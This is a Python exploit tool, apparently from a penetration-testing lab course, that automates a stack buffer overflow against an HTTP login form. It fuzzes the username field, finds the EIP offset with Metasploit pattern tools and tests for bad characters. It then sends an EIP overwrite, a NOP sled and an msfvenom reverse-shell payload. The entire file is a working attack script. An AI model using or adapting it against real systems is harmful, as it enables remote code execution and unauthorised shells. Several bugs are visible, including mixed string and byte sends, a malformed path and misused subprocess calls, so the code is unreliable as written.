try:
	import subprocess as sp
	import socket as s
	import logging
	from re import search
	from time import sleep
	from sys import exit
except ImportError as err:
	print(f"Import Error: {err}")


#-------------------Ansicolors
rst = "\033[0m"
bld = "\033[01m"
r = "\033[91m"
g = "\033[92m"
b = "\033[94m"


"""Custom error classes created for Ezfuzz"""
class InvalidTargetIPError(TypeError):
	"""Will be raised if the type of the target IP
	is not of type 'str'
	"""
	def __init__(self, error_msg):
		super().__init__(error_msg)


class InvalidTargetPortError(TypeError):
	"""Will be raised if the type of the target IP
	is not of type 'int'
	"""
	def __init__(self, error_msg):
		super().__init__(error_msg)


class InvalidMemoryAddressError(ValueError):
	"""Will be raised if value passed into the `jump_eip`
	does not contain a length of four which will be the four
	bytes that overwrite the EIP.
	"""
	def __init__(self, error_msg):
		super().__init__(error_msg)


class NoOffsetError(AttributeError):
	"""Will be raised if offset property has not been set"""
	def __init__(self, error_msg):
		super().__init__(error_msg)


#-------------------Ezbuff
class Ezbuff:
	""" Ezfuzz class definition

	Attributes:
		nop_sled (str): A raw string of 16 no operation bytes
		chars (str): All possible characters to test application for bad characters.
	"""
	nop_sled = r"\x90"*16
	chars = ("\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")


	def __init__(self, targ_ip, targ_port):
		"""Initialize variables

		Args:
			_targ_ip (str): Will store the IP of the target machine, default = None
			_targ_port (int): Will store the port number of the target application, default = None
			_bad_chars_found (list): Will store the bad character found by the user, default = empty list
			_offset (int): Will store the integer returned by msf's pattern_offset file
							that determines where the offset occured in the fuzzing process
			_num_bytes_crash (int): The number of bytes it took to crash the system,
									Note: the bytes are sent in increments of 50
			_receive_bytes (int): The number of bytes we will receive from the target machine at once
			_jump_eip (str): Will store the four bytes necessary to overwrite eip register with jump command

		Raises:
			InvalidTargetIPError: if invalid IP addresses is passed as an argument
			InvalidTargetPortError: if invalid port number is passed as an argument
		"""
		try:
			if not isinstance(targ_ip, str):
				raise InvalidTargetIPError("The target IP address must be a string.")
			if not search(r"[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}", targ_ip):
				raise InvalidTargetIPError("The target IP address is not a valid IP address.")
			self._targ_ip = targ_ip
			if not isinstance(targ_port, int):
				raise InvalidTargetPortError("The target port number must be an integer between 1-65535")
		except InvalidTargetIPError as err:
			print(r + f" Invalid Target IP: {err}" + rst)
			exit(1)
		except InvalidTargetPortError as err:
			print(r + f" Invalid Target Port Error: {err}" + rst)
			exit(1)
		else:
			self._targ_port = targ_port
			self._targ_ip = targ_ip

		self._bad_chars_found = []
		self._offset = None
		self._num_bytes_crash = None
		self._jump_eip = None


	def __repr__(self):
		return (f"Ezfuzz(\n\ttarg_ip = '{self.targ_ip}',\n\ttarg_port = {self.targ_port},"
				f"\n\tbad_characters = {self._bad_chars_found},"
				f"\n\toffset = {self._offset},\n\tnum_bytes_crash = {self._num_bytes_crash},"
				f"\n\tjump_eip = {self._jump_eip}\n)\n")


	def __str__(self):
		return f"Ezfuzz(target_ip_address='{self.targ_ip}', target_port={self.targ_port})\n"


	@property
	def targ_ip(self):
		"""Returns the current target's IP address"""
		return self._targ_ip


	@targ_ip.setter
	def targ_ip(self, new_IP):
		"""Sets a new IP addresses"""
		self._targ_ip = new_IP

	@property
	def targ_port(self):
		"""Returns the target application port number"""
		return self._targ_port

	@targ_port.setter
	def targ_port(self, new_port):
		"""Sets a new port number for target application"""
		self._targ_port = new_port
	
	
	@property
	def bad_chars(self):
		"""Return the bad characters set by user."""
		return "".join(self._bad_chars_found)
	
	
	def add_bad_char(self, bad_char):
		"""
		"""
		self._bad_chars_found.append(bad_char)


	def del_bad_char(self, bad_char):
		"""
		"""
		self._bad_chars_found.remove(bad_char)


	@property
	def num_bytes_crash(self):
		"""Returns the number of bytes it took to crash the application."""
		return self._num_bytes_crash
	

	@num_bytes_crash.setter
	def num_bytes_crash(self, new_bytes_value):
		"""

		Args:
			new_bytes_value (int): The number of bytes the user want to send 
								as opposed to the original number of bytes discovered to
								crash the application.
		"""
		self._num_bytes_crash = new_bytes_value
		

	@property
	def offset(self):
		"""
		"""
		return self._offset


	@offset.setter
	def offset(self, offset):
		"""

		Args:
			offset (int): The offset returned from the pattern_offset.rb file or set by the user.
		"""
		self._offset = offset


	@property
	def jump_eip(self):
		"""
		"""
		return self._jump_eip


	@jump_eip.setter
	def jump_eip(self, jump_mem_location):
		"""

		Args:
			jump_mem_location (str): The memory address that will be used to jump the EIP obtained
										to execute our payload.

		Raises:
			InvalidMemoryAddressError: if memory address is not 16 characters in length
								(the eight bytes from and the slashes and x's should equal 16 bytes \x8f\x35\x4a\x5f)
		"""
		try:
			if len(jump_mem_location) != 16:
				raise InvalidMemoryAddressError("The memory address to over the EIP register must be four bytes long.")
		except InvalidMemoryAddressError as err:
			print(r + f" Invalid Memory Address Error: {err}" + rst)
			exit(1)
		else:
			self._jump_eip = jump_mem_location


	def fuzz(self, chars=None, reverse_payload=None):
		"""Sends an incrementing number of bytes to an application
		until it crashes or returns an error and then prints out the
		number of bytes at the moment of the crash/error. If arg bad_char
		is passed, function will send bad characters payload.

		Args:
			chars (str): Will determine if bad characters string will be sent, default=None
			reverse_payload (bytes): Will store the contents of the msfvenom generated reverse shell
									payload, default=None
		"""

		buff = "POST /login HTTP/1.1\r\n"
		buff += "Host: 10.11.0.22\r\n"
		buff += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
		buff += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
		buff += "Accept-Language: en-US,en;q=0.5\r\n"
		buff += "Referer: http://10.11.0.22/login\r\n"
		buff += "Connection: close\r\n"
		buff += "Content-Type: application/x-www-form-urlencoded\r\n"

		self._num_bytes_crash = 50

		soc = self._create_socket()

		if not chars and not reverse_payload:
			content = "username=" + 'A'*self._num_bytes_crash + "&password=A"
			buff += f"Content-Length: {str(len(content))}\r\n"
			buff += "\r\n"
			buff += content

			print(g + "[+]" + rst + " Intiating fuzzing process...")
			while True:
				with soc:
					try:
						soc.send(buff)
						soc.close()
						sleep(10)
					except OSError:
						print(f"Number of bytes sent at crash: {self._num_bytes_crash}")
						self._num_bytes_crash -= 50
					finally:
						self._num_bytes_crash += 50
		elif reverse_payload:
			content  = "A"*self.offset + self.jump_eip + Ezbuff.nop_sled + reverse_payload
			buff += f"Content-Length: {str(len(content))}\r\n"
			buff += "\r\n"
			buff += content
			with soc:
				print(g + "[+]" + rst + " Sending reverse_shell payload...")
				try:
					soc.send(buff)
				except OSError as err:
					print(r + f" Socket Error: {err}" + rst)
					exit(1)

		else:
			content = "A"*self.offset + "B"*4 + chars + "C"*(self._num_bytes_crash-self.offset - 4 - len(Ezbuff.chars))
			buff += f"Content-Length: {str(len(content))}\r\n"
			buff += "\r\n"
			buff += content
			with soc:
				print(b + "[+]" + rst + " Sending bad characters payload...")
				try:
					soc.send(buff)
				except OSError as err:
					print(r + f" Socket Error: {err}" + rst)
					exit(1)
	

	def send_msf_pattern(self):
		"""
		"""
		payload = self._generate_msf_pattern()

		soc = self._create_socket()
		with soc:
			bytes_payload = bytes(payload, "utf-8")
			print(g + "[+]" + rst + " Sending Msfpattern payload...")
			soc.send(bytes_payload)


	def _generate_msf_pattern(self):
		"""
		"""
		output = sp.run(['/usr/share/metasploit-framework/tools/pattern_create.rb', self._num_bytes_crash])
		return output.stdout
		

	def get_offset(self, eip_chars):
		"""

		Args:
			eip_chars (str): The address that overwrote the EIP when program crashed
		"""
		output = sp.run(['usr/share/metasploit-framework/tools/pattern_offset.rb'], eip_chars)
		self.offset = output.stdout


	def test_offset(self):
		"""

		Raises:
			NoOffsetError: if the `get_offset` function has not been invoked.
		"""
		try:
			if self._offset:
				payload = "A"*self._offset + "B"*4 + "C"*(self._num_bytes_crash-self._offset-4)
				bytes_payload = bytes(payload, "utf-8")
			else:
				raise NoOffsetError("Please run `get_offset` to get and set offset value.")
		except NoOffsetError as err:
			print(r + f" NoOffsetError: {err}" + rst)
			exit(1)

		soc = self._create_socket()
		with soc:
			soc.send(bytes_payload)
		

	def send_bad_chars(self):
		"""
		"""
		copy_chars = Ezbuff.chars
		for char in self._bad_chars_found:
			copy_chars.replace(char, "")
		self.fuzz(copy_chars)


	def _create_socket(self):
		"""
		"""
		try:
			soc = s.socket(s.AF_INET, s.SOCK_STREAM)
			soc.connect((self._targ_ip, self._targ_port))
		except OSError as err:
			print(r + f" OSError: {err}" + rst)
			exit(1)
		return soc


	def get_payload(self, payload_file):
		"""Will retrieve the payload from a generated payload file
		and invoke the `fuzz` function to send the payload
		to the target machine.

		Args:
			payload_file (str): The name of the file containing the payload generated by Msfvenom
		"""
		with open(payload_file, 'rb') as payload_file:
			payload = payload_file.read()
			self.fuzz(reverse_payload=payload)
